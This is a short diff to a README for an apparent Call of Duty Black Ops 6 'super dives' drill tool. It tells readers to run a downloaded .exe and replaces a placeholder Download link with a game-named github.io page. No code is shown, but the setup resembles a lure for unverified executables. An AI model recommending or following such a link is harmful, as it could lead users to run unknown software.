@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://super-dives-call-of-duty-black-ops-6.github.io/.github/)
 
 ## 📸 Overview
 ![bo6-super-dives-drill-dashboard](https://github.com/user-attachments/assets/27f69082-ee15-4d30-9207-5694127337c9)
